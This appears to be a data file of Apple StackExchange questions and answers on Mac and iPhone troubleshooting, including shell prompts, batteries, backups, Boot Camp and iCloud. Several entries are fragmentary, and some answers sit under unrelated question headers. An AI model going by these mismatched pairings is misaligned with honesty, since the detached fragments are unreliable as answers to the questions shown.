~/.bash_profile\necho 'export PS1='\"'\"'\\h:\\w \\u\\$ '\"'\" >> ~/.profile\n\nor\necho \"export PS1='\\\\h:\\\\w \\\\u\\\\\\$ '\" >> ~/.bash_profile\necho \"export PS1='\\\\h:\\\\w \\\\u\\\\\\$ '\" >> ~/.profile\n\nThis will make the change persistent.\nTests were made on iOS 11 with root shell, but everything in this answer works on macOS as well.\n\nA: sudo su prompts sh-3.2# in my Mac too, unlike linux kernels.\nIt’s sudo -i that gets you to the blah-blah-Air:~ root#.\nWhen you use ls in each however, you’ll notice the sh-3.2# lists much more directories and files than your :~ root#.\nTry sudo -s or sudo -i if you want the :~ root#.\nI heard, -s is to \"keep environment”, -i is to have a “new login shell”.\nGet more info about sudo commands by typing man sudo in your terminal.\n", "Q: My 3 years old 13'' MacBook Pro Retina doesn't sit flat There are 4 rubber feet on the bottom of MacBook Pro. They worked well before. But recently 2 of them (near the touch pad) cannot touch the flat.\nI phoned Apple support and she said that this is most likely because the battery is bloated. And she suggested me send my MacBook to the Genius Bar for repair.\nBut I use several battery status checker apps, such as coconutBattery, battery monitor and the built-in one, they all say my battery is good.\nSo what happened?\n\nA: I had a similar experience with my 2013 MacBook Pro. The battery was bloated causing the MacBook to wobble even on perfectly flat glass.\nBattery checker apps like CoconutBattery were reporting it to be normal. Even macOS wasn’t showing any battery warnings (I have consumed only a reasonable number of charge cycles).\nWhile the cause of bloating still remains unknown to me, Apple service recommended me to replace the battery as the continuous bloating may end up causing damage to the board, bottom case, trackpad and the keyboard.\nIt is advisable to get the battery replaced as soon as possible.\nNote: After getting the battery replacement, I sought advise on do's and don't from the technician. I was told that this wasn't an expected behaviour and happens in rare circumstances. Thus, the cause for bloating remains unknown to me.\n", "Q: iPhone storage increasing over time My iPhone 5s storage increases for some reason. It used to have 4.3 gb yesterday and now it’s 7.48 gb! I didn’t do much. My photos are still there. I’m scared. What do I do and why is it happening?\nAlso system is decreasing size.\n\nA: There are a few potential reasons for this.\n\n\n*\n\n*If you installed a system update, the update data will be removed post update which can result in a large amount of space being.\n\n*Apple have begun to implement several space saving features into iOS, which offload unneeded content to iCloud Drive or just remove it.\n\n*You may have removed some optional system content, such as dictionaries, which freed up space.\n\n*Rebooting your iOS device can sometimes free up some space, as iOS is based off of BSD so logs and temporary data may be expunged on reboot.\n\n", "Q: Which folders should be copied when performing a manual backup? I know that Time Machine and various backup softwares can be used to save some or all Mac data.\nHowever, if I don't want to use any of them and simply copy data to an external hard drive, which folders should be saved?\nThe only list of suggested folders to backup that I found is this one:\n\n\n*\n\n*Macintosh HD/Users/ : users data\n\n*Macintosh HD/Applications : (optional) applications\n\n*Macintosh HD/Library/ : (optional) some applications preferences\n\n\nIs this accurate or is there any other folder that should be copied ?\n\nA: The /Users folder is the most important, thats where all your personal data is kept.\nThe items in /Applications folder can always be re-downloaded but won't hurt to back them up too. Pay special attention to the apps that can't be easily obtained by downloading from the Mac App Store or from their web-site, like older version of app, an app no longer available from the developer/publisher or a self build app.\n\nA: Like most things in life, I think it depends :-)\nAt one extreme, you might want to back up absolutely everything, so that in the case of a disk failure you can restore to precisely where you were: every app, file, setting, configuration, &c.  This isn't really practical to do manually.  (It'd need root access, knowing exactly which vm/cache files to exclude, what to sync first, &c.)  Time Machine can create incremental backups, and tools such as Carbon Copy Cloner and SuperDuper! can create clones of your drive(s).\nAt the other extreme, you might only want to back up your most irreplaceable files (e.g. documents, photos).  This should be easiest, but will of course require the most work in the case of a failure (re-downloading and reinstalling apps, re-setting up all the config, &c).  For this, you should know where the files are; it's easy to copy them by dragging them to another drive.\nFor something in the middle, it depends what you might have changed and how much effort you want to put in…\nI think the question has already given the three most important areas, which will probably include all the important stuff for most people:\n\n*\n\n*/Users\n\n*/Applications\n\n*/Library\nIf there's anything vital elsewhere, then you'll probably already know about it, because you'll have set it up yourself!  Examples might include:\n\n*\n\n*programs/libraries you've compiled and installed in /usr/local, /opt/local, /opt/sw, or /opt/homebrew (manually or via a package manager)\n\n*hosts file entries you've added to /etc/hosts\n\n*directories you've created under / (before macOS 10.15 Catalina)\n\n*locales you created in /usr/local/share/locale\n\n*daily/weekly/monthly scripts you created or linked under /etc/periodic/\n\n*a message-of-the-day you wrote to /etc/motd\n\n*files you've written elsewhere (e.g. /bin or /usr/bin) by disabling System Integrity Protection\nAlso bear in mind that apps, drivers, and anything else that's not plain data will need care to preserve user, group, permissions, ACLs, &c; most external filesystems won't fully support all of those.  And you may need root access to back up and/or restore some things.  All in all, it's much easier to leave it to a dedicated program!\n\nFinally, this is a good opportunity to remind everyone of the importance of backups.  There's no single correct strategy; everyone's needs are different.  But please think about what would happen if a disk died, and do as much or as little as you need to prevent that becoming a disaster.\n", "Q: Unable to use Boot Camp to switch boot device between MacOS/Windows 10 I have a Mac Pro 4,1 upgraded to a 5,1 with MacOS installed on an SSD and Windows 10 installed via a hacked Boot Camp on a separate HDD.\nI'm running a GTX680 GPU which is Mac OS flashed to allow the display of the Mac boot screen over HDMI, but as I run a displayport connection, this is not that convenient when I want to switch from one OS to another.\nI can use the Boot Camp option under both MacOS and Windows to choose by boot drive, but the Mac will always boot to Windows unless I switch to an HDMI connection and use the alt-key on reboot to choose my startup drive.\nThe SSD with MacOS on it is connected to the second optical drive SATA connection; the Windows drive is in the first drive bay. \nAny idea why choosing the boot drive via Boot Camp is not working?\n\nA: You could try creating a USB flash drive with rEFInd installed. Make this your default boot drive. Next, see if rEFInd can be used to boot both operating systems. If so, then you could install rEFInd on your HDD or SSD to silently boot macOS.\n", "Q: Applescript to drop down Script Editor in Menu Bar I want to write a script that will drop down the menu of the script editor from the menu bar, but without selecting a menu item from it. The idea is to give the script a keystroke shortcut (like F15) that will run the script, drop down the menu choices, and then I will select the script from the list to execute. This saves me having to navigate the cursor over the script icon in the menu bar and then click on it to drop the menu down. Instead, I just press F15 and voila! It appears.\nAny suggestions will be appreciated. I made some attempts adapting other examples, but could not make any of them work. I was hoping for something as simple as: \ntell application \"System Events\" to click process \"Script Editor\"\n\nor\ntell application \"Finder\" to click process \"Script Editor\"\n\n\nA: The AppleScript code you're looking for is:\ntell application \"System Events\" to ¬\n    click (every menu bar item of menu bar 1 ¬\n        of application process \"SystemUIServer\" whose description is \"AppleScript\")\n\nAs to assigning F15 to that, well you'll probably need a third-party utility to do that, as I do not believe an Automator service supports using just a single function key, (or any function key), as its keyboard shortcut.\nI use a utility called FastScripts for many of my scripts and it will support a single function key.\n\nNote: I am not affiliated with Red Sweater Software, the developer of FastScripts, just a satisfied user.\n", "Q: Does the time zone in a mail header help me to identify the country of origin? I sent this from Ct USA eastern time last night. When he replied it says GMT. Does this mean he is in England or another country).\n\n\nA: All we can deduce from this is that the sender is using a computer (or an iPad) on which the time zone is set to GMT+1. If accurate this means western Europe or parts of Africa. But as everybody can set their computer to whatever time zone they like it could be from anywhere.\nFor more information about time zones see the Time Zone Map or the Time Zone entry on Wikipedia.\n", "Q: Is it possible to exchange the F1, F2 key functions for the F3, F4 key functions ? I was wondering if I can switch the functionality of the F1 and F2 keys (brightness down,up respectively) and pass it to the F3,F4 keys; subsequently switching the functionality of the F3,F4 keys to the F1, F2 keys. \nI want to keep the functionality of all the keys but swap their locations. \nIs that possible? \nMy operating system is High Sierra V10.13.6\nThank you! (and sorry if the answer to this question is obvious!) \n\nA: If third-party software is acceptable, Karabiner-Elements allows you to do this quite easily. You can manually assign each key's function independently, either to emulate another key or to activate a certain action, such as controlling the brightness.\nHere's what these settings would look like, if I understand your question correctly:\n\n", "Q: MacOS: Add browser tab (i.e. Gmail) to application switcher? I use Gmail for email in my Google Chrome browser. Is there a way to make Gmail appear as an application that I can choose using the application switcher invoked with Cmd + Tab?\n\nA: Use Fluid:\n\nFluid lets you create a Real Mac App (or \"Fluid App\") out of any website or web application, effectively turning your favorite web apps into OS X desktop apps...your chosen website has a permanent home on your Mac as a real Mac application that appears in your Dock.\n\nGmail is even one of the examples they show in the video, and it supports features like badging the application icon when you have new messages.\n\nA: Browser tabs cannot be added to the application switcher; only running applications can. However, there are various native wrappers around Gmail (by Googling, I found Kiwi and Mailplane for traditional Gmail and Boxy for Inbox by Gmail, although there are plenty others out there) and services that will simply construct a native app that is merely a web view containing a specified website (i.e., Gmail) (these include Fluid and Applicationize, though, once again, there are many others). These native apps (or those generated by these services) can and will appear in the application switcher when active.\nNote that I am not affiliated with, and have never used, any of the services mentioned herein.\n", "Q: Keyboard and Mouse start behaving oddly. I've had to restart my Mac to fix this I imagine I'm hitting some serious of hotkeys but on rare occasions, my Mac will start handling keyboard AND mouse clicks in an odd way.\nThis just happened and, all of a sudden, here are some of the oddities that were happening.\n\n\n*\n\n*Whether caps lock was on or off (as indicated on my keyboard by the light), ALL TEXT WAS IN CAPS.\n\n*In parallels, if I clicked on some text and moved my mouse, the text would highlight as I moved my mouse, as if I were holding down the mouse button.  I wasn't.\n\n*In Chrome (in macOS, not my parallels OS) clicking on a link would open a new tab.\n\n\nThere were some other odd behaviors but I didn't catch them all.  I was able to restart the machine from the macOS menu and, thankfully, this turned off whatever mode was turned on.\nSo, any idea what happened and how to cancel next time?  I have a hunch that this is an accessibility feature, but I have no idea what that would be much less how to turn it off.\n(Just in case these details are required, I have a 2017 MBP, and I'm on the most up-to-date version of macOS High Sierra.)\n\nA: The symptoms you are describing point to a stuck key which is plaguing the new 2016 through 2018 MacBooks and MacBook Pros with the new keyboard.  My guess is that one of the Shift keys may be (becoming) stuck.\n\n\n*\n\n*Text in all caps\n\n*Text being selected as you move your mouse\n\n*New Tab/Windows opening when you click a link\n\n\nTry using an external keyboard - this will confirm if the problem is the built in keyboard or not.  If the problem goes away, the keyboard needs to be replaced. \nUpdate (from comments below):  Since you're using an external keyboard, it's entirely possible that that keyboard is having issues.  Try using KeyCodes (free app) to see what keys are being pressed.  If a key is stuck, it will show up in this event viewer.\n\nA: Really this could be hardware or software. The first step is to figure out which it is.\nFirst, start the Mac in Safe Mode: hold down the shift key while booting, when you see the Apple logo release the shift key and wait for boot to finish. It will take a lot longer than normal as it does a lot of housekeeping at startup in safe mode.\nIf the problem goes away in safe mode, congratulations, it's software. Unfortunately you now need to look through all the stuff you have installed to figure out what is messing things up. Most likely something that runs at startup.\nIf the problem persists in Safe Mode, try creating another user account: System Preferences > Users & Groups > unlock > Click the + at bottom left.\nThen log in as that user and see if the issue persists. If not then something in your original User profile is causing problems. Probably something that runs at startup, but possibly a damaged preference file of some sort. You can spend a lot of time figuring out what it is or just move your files to the new profile and delete the old one.\nIf the problem persists across all of this I would start to believe that it is hardware and a trip to an Apple store might be in your future.\n", "Q: Remove cosmetic margins from edge of TextEdit window?

I get no error message or anything. I tried using iCloud and Internet Accounts from the System Preferences panel and the only difference is that if I try to add it from Internet Accounts, it shows up for a few seconds and then disappears.\nIt all started because I could not select iCloud keychain under the stuff I wanted to synchronize so I signed out. When I try to sign back in this started happening.\nI thought it may be due to a network issue but I have tried both wireless and wired connections but I cannot get past this step.

That fixed it.\n", "Q: Is it possible to use Apple remote desktop to macOS High Sierra and disable the screen on the remote station? I don't know about you, but for me it seems a trivial thing to do if I were an Apple engineer. Microsoft does it perfectly. \nMy question is why can't I remote to a far macOS High Sierra station and don't show my work with the people sitting next to me.\n\nA: As Allan said in a comment, Apple Remote Desktop supports this functionality with the Curtains command, so if you're using a third-party client to access your computer with the Apple Remote Desktop protocol it's up to that client to provide a way for you to activate that feature.\nIf you're accessing a MacBook using its built-in display, you could always simply decrease the brightness to zero. Technically the display is still active, but it's practically impossible to see in most conditions. You can also do this for an iMac, though the backlight does not dim fully. You can do this in System Preferences > Displays, if you can't send the key commands to decrease brightness.\n", "Q: VM volume showing up in /Volumes I notice that if i run a first-aid scan in the Disk Utility app on what's known as \"Container disk1\", it shows a mounted volume called \"VM\". To my understanding, VM stands for \"VirtualMemory\" and its a volume that is mounted but hidden in the Finder; it shows up in the Disk Utility app as an amount of storage of 'Container disk1' and doesnt show itself mounted(https://i.imgur.com/O7A8wEB.png). But ive seem to notice every time after a first-aid scan is finished preforming on 'Container disk1' it shows VM mounted in the Finder; restarting my MacBook makes VM hidden again. Here are the steps i used to produce this:\n1) restart MacBook into normal boot mode(even if already on)\n2) after restart open the Disk Utility app and select 'Show All Devices' in View\n3) select 'Container disk1' and run a first-aid scan on the container disk\n4) open \"/Volumes\" path in the Finder after first-aid is finished\nIm unsure if this is expected behavior of the first-aid scan on the 'Container disk1' and im unable to test it out on another MacBook as i only have the one. Is this expected/normal behavior? Can anyone else test this out for me to see if VM also shows itself mounted after running first-aid on 'Container disk1'?\n\nA: this is normal behavior of the new APFS format as scanning the container disk will show the VM volume in the finder as it's scanned\n", "Q: What's the oldest MacBook Pro that has the Meltdown/Spectre patches? I currently have a 2014 MacBook Pro, but it needs to go in for service and, rather than renting one for a week, I was thinking of buying a cheap backup (maybe from 2011 or 2012).  What is the oldest model that would incorporate Intel's complete set of patches for Meltdown/Spectre (aka Speculative Store Bypass Variants 1–3)?  \nAccording to what I've read (see details and sources, below), patches are available from Intel for the chips used in the 2010 and later 15\"/17\" MBP's, and for the 2011 and later 13\" MBPs.\n[DETAILS AND SOURCES: According to Intel's patch guidance (https://newsroom.intel.com/wp-content/uploads/sites/11/2018/04/microcode-update-guidance.pdf), patches have been offered for Sandy Bridge and Arrandale, but not for Penryn. And according to https://en.wikipedia.org/wiki/MacBook_Pro (go to \"Table of second generation MacBook Pro models\" and click \"Show\"), the 2011's all use Sandy Bridge.  With the 2010's, it gets a bit tricky: The 2010 MBP's used either 2.4 GHz (P8600) or 2.66 GHz (P8800) Penryn chips; or 2.4 GHz (520M), 2.53 GHz (540M), or 2.66 GHz (620M) Arrandale chips. And, according to https://everymac.com/systems/apple/macbook_pro/macbook-pro-unibody-faq/differences-between-macbook-pro-13-15-17-inch-early-2011-and-mid-2010.html, the Penryns are in the 13\", while the Arrandles are in the 15\"/17\"; if that's correct, patches are available for the chips used in the 2010 15\"/17\" models, but not the 2010 13\" ones.  The models from 2009 and earlier all use Penryn or earlier, so none of these are patched.]\nHowever, it's not sufficient that Intel offers the patches.  It also needs to be the case that Apple has incorporated those patches into the latest OS the chip family is capable of running.  According to this chart (https://www.apple.com/lae/macos/how-to-upgrade/#hardware-requirements), one can run High Sierra on all MBP's from 2010 onward.  But that doesn't necessarily mean that Apple, within High Sierra, has made available patches going as far back as possible (i.e., that High Sierra contains Intel's Sandy Bridge & Arrandale patches).  I assume it has, but I'd like confirmation.\nFurther, there's a practical performance question: I've not noticed a performance difference with the patch on my mid-2014 MBP.  But is the percentage degradation in performance significantly higher with older chips?  [\"We may see a marginal impact and take a bit of a hit, but the newer processors don't have a huge loss. Older processors have more of an impact.\" ——John Michener, Chief Scientist, Casaba Security. Source:  https://www.wired.com/story/meltdown-and-spectre-patches-take-toll/ ] [I don't know if he means that older processors show more percentage degradation, or simply that older processors, being slower to start with, have less performance headroom.]\nPragmatically, I'd like it to be decently-usable (rather than marginally usable) with Office 365 (even my top-of-the-line 2.8 GHz mid-2014 15\" model struggles a bit with Office).\n\nA: Apple incorporates these patches into their macOS updates.\nMeltdown and Spectre were addressed with the following security updates:\n\n\n*\n\n*macOS High Sierra 10.13.6, \n\n*Security Update 2018-004 Sierra \n\n*Security Update 2018-004 El Capitan\n\n\nSince the MacBook Pros from 2011 and newer are all capable of running High Sierra, you can be certain that the patch has/will be applied if you run an up-to-date version of El Capitan, Sierra, or High Sierra.\nAs for performance, according to MacRumors, per Apple, there's no noticeable impact on performance.\n\nSpectre and Meltdown take advantage of the speculative execution mechanism of a CPU. As these use hardware-based flaws, operating system manufacturers are required to implement software workarounds. These software workarounds can impact processor performance, but according to Apple, the Meltdown fix has no measurable performance reduction across several benchmarks.\n\n", "Q: Using Apple Remote Desktop to view External HD files Can I have my Macbook Pro offsite access my other Macbook Pro at home using the Apple Remote Desktop? (Or if you know of another better way to access, let me know.) \nIf so, can the Macbook Pro at home have an External Hard Drive connected which I can access those files remotely? \n\nA: I can not advise regarding Apple Remote Desktop since I do no have access to this software and I do not wish to purchase said software.\nHowever, Apple's Back to My Mac free software can provide remote access to your home computer files and screen sharing.\n\nNote: The instructions shown below were copied from this Apple website.\n\nIf you have an iCloud account, and you have several computers connected to the Internet, you can share the screen of one computer with other computers.\nFor example, if you have a Mac at home that’s connected to the Internet, you can share its screen with a Mac you use at work.

Wi-Fi passwords used to sync between my devices via iCloud Keychain, a wifi password entered on my MacBook would end up on my phone via the 4G connection, and the phone would automatically connect, handy.\nAs of the last update this doesn’t happen, now I have to bring my phone next to my laptop and tap the share notification to pass it over Bluetooth to get the phone to connect, it’s slow, and half of the time doesn’t work.\nDid Apple really scrap the iCloud sync solution to force everyone to use the Bluetooth one that is way more suited for sharing with friends rather than between my own devices?\n\nA: I bumped into this question when searching for the problem. \nAnd I figured out iCloud didn't set up (or logged in) on my Mac OS X. When I logged in to icloud, KeyChain access created a new tab for iCloud just under the Login tab. \nPlease be sure, you set up iCloud on your Mac OS X.\nhttps://support.apple.com/en-us/HT208682\n\nA: I had the same problem.

It seems to look like I'm on a network under \"WINS\" (?) and I can't change anything in \"Proxies\" or \"802.1X\" \nI turned on FireVault (with a recovery key) and FireWall. I also set a login password, required immediately, and only allow apps from the Apple Store. \nThe other pics are my WiFi setting and Directory Utilities if it's helpful. I have Komros installed and Avast and use them every time I log-on. \nThank you!\n\n\n\n\n\n\nA: If you are really worried, backup and then do a wipe and re-install. This will get rid of most unwanted things. Then manually restore important documents and files from backup. If you are not THAT worried, install a firewall/traffic monitor (LuLu, LittleSnitch, RadioSilence) and just monitor the network activities.\nThe reason you can't \"Administrate\" can just be that you were not added as an \"Administrator\" when the account was created. Check in System Preferences > Users & Groups to see if you are an administrator. You can add yourself (if you are not already) as a sudoer and make yourself an administrator though I'm don't feel comfortable explaining this process, use your search engine of choice.\nYou can list hidden users, check running processes and network traffic in search of something suspicious though it is not always trivial and if you are really that worried, wipe and re-install. \n\nA: None of these screenshots appear to be immediately suspicious. \n\n\n*\n\n*The terminal command you ran just lists info about all the wifi\nnetworks in the vicinity.\n\n*\"nobody\" is a standard Unix alias present\non all Macs.\n\n*It's normal for the WINS settings to be filled in\nautomatically by MacOS.\n\n*You can't change any advanced network\nsettings unless you're either an admin user, or you clicked the\npadlock in the Network settings pane and entered an admin username\nand password.\n\n", "Q: What is the unit of `Power_On_Hours` in `smartctl`?

Thanks. \n\nA: SMART Monitoring Tools\nThe smartctl tool claims hours, so that suggests one or more of the following:\n\n\n*\n\n*A fault in the tool;\n\n*A fault in your drive reporting firmware;\n\n*Or that your drive was only active for six hours during that period.\n\n\nDrives will power up and down whenever they can to save energy. Six hours of storage access may not be unrealistic but it all depends on how the computer is used.\nTry using the -v flag to customise the output. You can specify times in minutes or other units. This may give a better insight into the reported values.\nIf you need help using and understand the results of smartctl, please contact the developers.

There was another error on a line in the /private/etc/apache2/extra/httpd-vhosts.conf as well, but I can't remember which line. I tried everything to find the errors. Then I ran across question on your forum \"Can't access apache-powered website at localhost [duplicate] and followed those instructions to reinstall Apache.

The craziness life throws at you all at once is unbelievable at times. \nNonetheless, I had obtained a copy of a httpd.conf file that I thought was for v2.2, but it was for v2.4.  That had messed me up even more.  Once I received the correct copy, I replaced the original and duplicated it for backup and put everything back to the way it was. Now my php, mysql, and site folders are working perfectly together. I still cannot get to the MySQL database page and apparently the reason why is because I downloaded Bootstrap (which I don't think that altered anything because I haven't used it yet) and Atom text editor and live server. Now that took over everything! I haven't utilized it yet. I have been using TextWrangler, because I have been time crunching on a project. I'll figure out Atom later.\nSo, in a nutshell, I believe Atom has taken over the MySQL access page. But everything else is working fine. Also, I will have to practice a bit more on setting up virtual hosts, because that is when everything went wrong and how I got to Atom. \n", "Q: Safari notifications I've disabled prompts for notifications in Safari but still get them.

I can't remember the password and without the password ,I can't restore my backup on a new iPhone. The old iPhone is broken ..\n\nA: The entire idea of encrypting something is you can't access it without the password. Passwords are never stored anywhere in plain text. \nModern password structures mean that only a hash of the correct input is stored.\nIf you input the correct password, the hashes match; without the password ever actually been stored anywhere at all, only the 'maths' necessary to test for when it is entered correctly.\nSo, in short, if you don't have the password, you don't have access to the data.\nNot even Apple can unlock it for you.\n\nA: There's not a stored password on Windows iTunes, unfortunately.

Then, open the first A3 image in Preview.\n\n*Select all (⌘ + A), then copy (⌘ + C)\n\n*Select \"Tools\" From the menu bar, then select \"Adjust Size...\"\n\n\n*Firstly, click the small padlock icon to make sure the size adjustments are not locked. Now, assuming you are using landscape images, enter : Width = 9933 Height = 7016 PIXELS (ISO A1 paper size). If you are using portrait; simply swap the values.\n\n\n\n*This will instantly stretch the first image to A1 size. Now paste in the original first image (⌘ + V) and position it to the top left hand corner, ensuring to use the arrow keys for fine adjustments.\n\n*Now, open the second image in a new Preview window, select all (⌘ + A), then copy (⌘ + C) and and paste it into the new image we are creating (⌘ + V) and move it to one of the corners, ensuring to use the arrow keys for fine adjustments. \n\n*Repeat the step above for the remaining two pictures until you are satisfied with the positioning.\n\n*Finally, save as a new image.\nHopefully, you should now have an A1 sized image made up of your 4 component A3 images. Of course, Preview is in no way regarded as a professional image editing application and has only very limited functionality. Therefore, if you are willing to invest some money (or already have), Adobe Photoshop makes virtually the same process a whole lot easier.

With this mechanism Office is able to show a dialog like \"You can't save this file as it is currently opened by XXX\". The filename is ~$<original file name>, so test.xlsx has the lock file ~$test.xlsx. \nThe problem is that those files are still visible on the Mac, even when the Office document is already closed. I crosschecked the folder contents from a Windows VM and wasn't able to find the lock files. Also the guy, which the Mac claimed to have the file open, actually didn't had it open.\nI have no idea why those files are still shown on the Mac when they actually aren't present anymore. Could this be related to the ~ sign in the name? Or do we have to add some mount options to the SMB share?\n[Edit] The computer is connected via Gigabit Ethernet, the building is connected via 10G fiber to the data center. Throughput to the SMB share was around 80MB/s the last time I measured. So, I guess, this doesn't count as slow connection. \n[2nd Edit] I don't know about the OS of the central server. But the Mac is connected to an Active Directory which is provided by Windows server (at least I have remote access to a Windows machine where I can manage my department users). The local user account is not connected to the AD, but when mounting the remote share, an AD user is used for authentication.\n\nA: This happens all the time in my experience for enough Mac clients that hit a server that can’t keep up with the requests. You almost surely cannot change this on the Mac end and need to either deal with broken temporary files or be sure your support organization reviews the performance / loading of the appliance and OS that actually runs the SMB shares.\nAt best, you could check what version of SMB was negotiated and if you’re using an older protocol, try to force your mac to connect SMB v3 or so. (This is the only time when you might be able to “solve this” on your end)\n\n\n*\n\n*https://support.apple.com/en-us/HT207520\n\n*https://support.apple.com/en-us/HT208209\n\n*https://support.apple.com/en-us/HT205926\nYou can also upgrade to High Sierra as it has a lot of settings changes to make SMB browsing and sharing better.\nThings to ask the people that support the SMB share at work:\n\n\n*\n\n*give them specific dates, times, IP address of your mac when you see these issues.\n\n*give them the full path\n\n*ask if the storage / disks have convention or performance overload\n\n*ask if there is a macOS best practices document from the vendor and if they can or plan to implement all the items.\n\n\n*\n\n*Some specific items are patching to recent SMB versions that include things like vfs_fruit extensions, disabled changing permissions from mac clients on file moves, clean up scripts or suppression of things like .DS_Store files, whether .TemporaryItems is writable by all at the root of the share, if they can enable debugging logs for the folder where you save your files or set up a small test share so they can change that to match the “best practices” and see if these orphaned / ghost files no longer happen\n\n\n*tell them if you can make this happen reliably and on command - that is gold for them to debug a share - without it they can’t test things out methodically and have to wait for a timing or repeat of the issue\n\n", "Q: How to Configure extra buttons on mouse I have a mouse that I bought from eBay and has two buttons on the side. For some reason, these keys don't do anything. In the modifier keys section of the keyboard settings, it called the mouse \"SiliconWin mouse\", I changed all the keys to command and no command worked. I thought these keys served no purpose but I later found if I pressed an application in the dock with the key, it would do the same thing as a right-click.

Yeah you can plug it in but without the correct drivers you will be lucky to get even minimal use out of the device.\nIf your SiliconWin mouse is not working out of the box with your Mac and there are not drivers provided by the manufacturer then there is little you can do in macOS to properly configure the device.\nThere is a \"Universal USB device Driver\" that has been available on the Mac for a long time, USB Overdrive.\nThough I have never used it myself I have seen lots of discussions that point to that as a solution to exactly the problem you have. It's not free, a license will cost you $20. I imagine you could download it and give it a try and see if it allows you to do what you need to do. But at twenty bucks it costs as much (or more) as a cheap mouse so the economics of the situation may not be in your favor.\n\nA: I made Mac Mouse Fix.\nIt lets you remap your Side Buttons to Windows style Back and Forward (just like Sensible Side Buttons - in fact I copied their code) or to Switching between Spaces. It also lets you remap the Scroll Wheel Button to some useful functions like Mission Control and it features a refined Smooth-Scrolling algorithm, which I think strikes a great balance between fluidity and control. \nMac Mouse Fix is very light on system resources and it's a System Preferences Plugin so there's no status bar item. I tried to make it as clutter-free as possible.\nOn top of that, it's 100% free, it doesn't sell your data or anything, it's lightweight, easy-to-use, and fully open source.\nYou can download it here, or check out the GitHub repo here.\n", "Q: iCloud Drive not downloading files after reset I'm on a 2016 MacBook Pro with macOS High Sierra 10.13.5. Yesterday, due to the huge amount of 'Purgeable' storage present on disk, the system started to 'purge' it, freeing about 200GB of space. In doing so it also apparently removed many local copies of the iCloud Drive files (I have Documents and Desktop sync'd), as the little cloud appeared next to many of them.\nAt the same time the Finder started to try and upload 22GB of files (crazy because they were all up there in iCloud Drive).\nI sought help from Apple and they make me deactivate iCloud Drive (which created a folder with all my files -except for the iWork and similar files, in the Home folder).\nUpon reactivation iCloud Drive is not making any progress with the download... files are not reappearing.. folders neither..\nThe 'expert' said that if I paste the iCloud Drive (Archive) folder inside it will only create duplicates.\nWhat can I do? How can I solve this?\nMy last resort is to back restoring the system from Time Machine but I would like to know why iCloud Drive is not downloading the files.\nThank you very much\n\nA: I see you've resolved your situation, but I wanted to write up a formal answer.\nWhen you enable iCloud Drive, it has to go through a (very slow) process for each container of files before they show up. Each App Folder is one such container, and then all standalone files including Desktop and Documents goes in a generic container.\nIf you have lots of files (10+ GB can cause this to start happening) it can take hours (or days) before the files show up, even though they haven't even started downloading. In this time sync will not finish. If you have just enabled iCloud drive (either on a new computer or because you had turned it off) and you have a lot of files, trying to leave it plugged in etc. may help it go faster. Do not try to turn it off and then on, because it'll just start over.\nI'm not sure why this happens, but it's the way it works right now. So if you don't see files after turning it on, let it sit for at least a day or two of having proper power and internet connection before trying other things.\n", "Q: How to migrate to a new Mac, including SSH keys and dotfiles? I have an up-to-date 2018 MacBook Pro that I am replacing with a different 2018 MacBook Pro. I'd like to migrate all the content from the first one to the new one, including the SSH keys, all the dotfiles (.gitconfig, .zshrc etc.), PostgreSQL databases, Homebrew-installed packages, and the system and application preferences.\nDoes macOS Migration Assistant transfer everything from one drive to another? Or does it only look at apps, documents and ignores configuration files?\n\nA: Yea, macOS Migration Assistant ignores configuration files.\n\nA: The only way to copy EVERYTHING will be to clone the drive, as far as I'm aware.  You may be able to use Time Machine if you have a current backup of your \"old\" Mac, and connect that drive to the new Mac.  Time Machine includes settings.\n\nA: Mackup is really good as you can get a really recent version of the files configured, and you can easily write your own configuration files to backup other specific files and locations you may want! If you create a brewfile and list of what you’ll need I found it fairly easy to reinstall dotfiles, formulas, apps quickly! \n", "Q: Trick Macbook to not recognize HDMI connection with external monitor but still mirror the screen to it I am not even sure if my question is achievable or completely dumb.\nI connect my macbook air (macos High Sierra) to an external display via HDMI. As you know whenever you plug the cable in the laptop the new external monitor/ TV is recognized in System Preferences.\nIs there a way to send image to the external display and at the same time not recognize the HDMI connection? I have software that stops running whenever an HDMI connection is established and am wondering whether there is a way to trick it?\n\nA: No, it does not technically make sense to send an image to the external display while at the same  time not recognizing the HDMI connection.\nHowever what can be done is presenting an environment to the specific app where it is not told about the HDMI connection:\nAn easy and practical way of doing this is to run the app inside a virtual machine (using software such as VMware Fusion or Parallels Desktop).\nAn better, but more involved, approach is to override the specific library functions that the app uses to inform itself of the HDMI connection. The overriden functions would simply hide the fact that an external HDMI connection is made. Creating such an override usually requires programming experience in order to create what is essentially a shared library. The library could then be loaded using the environment variable DYLD_INSERT_LIBRARIES when launching the specific app.\n", "Q: Booting from a previously cloned Windows 10 installation I have a cloned drive as a backup and my computer is stolen. \nThis computer was probably MacBookPro 11,2.\nNow i have an old MacBookPro 6,2, i installed my backup drive as an internal drive to this one. \nI can boot to my old OSX Sierra and happy about it. \nThe second partition has a Windows 10 installation in it. \nI can't see this partition in option-boot screen. \nI can reach my Windows 10 partition from OSX.\nHow can i install or modify the necessary software to make this partition bootable again? \nI know i need the drivers for this particular computer and i have downloaded them from boot camp.\nIf i can boot to my partition i install them and continue using my old operating windows, am i right?\nThank you. \n\nA: \nNote: There is no guarantee that if successful, Windows 10 will remain activated on the Mac. In other words, you may need to purchase a Windows 10 license for your Mac.\n\nThe Windows 10 install you wish to restore to your Mac used the EFI boot method (as used by most Macs since 2012). Since the drivers you have downloaded require a BIOS boot method (the legacy method), you will need to convert the restored Windows from an EFI boot method to a BIOS boot method.\nYou will need to make sure your internal drive is using a Hybrid GPT+MBR partition scheme. See this answer for details.\nYou will need to boot the computer using a Windows 10 DVD or bootable USB, select the option to repair the installation, open a Command Prompt window and enter the following commands. A bootable USB may require High Sierra (macOS 10.13).\n\nNote: You can also open a Command Prompt window, by pressing the shift+F10 key combination after booting from the DVD or USB.\n\nbootsect  /nt60  c:  /mbr\nattrib  -r  -h  -s  c:\\boot\\bcd\ndel  c:\\boot\\bcd\nbcdboot  c:\\windows  /s  c:  /f  BIOS\n\nThis will repair the files used to boot Windows.\n\nNote: You can ignore any error messages produced by the attrib and del commands.\n\nAfter booting to Windows 10, you should install the Windows Support Software that you downloaded from Apple.\n\nA: I found out that the CCC (Carbon Copy Cloner) which cloned my drive formatted the cloned windows partition as HFS so i think it is impossible i will reinstall windows 10.\nNo answer needed, thank you. \n", "Q: Can similar apps be uploaded on Apple Store?

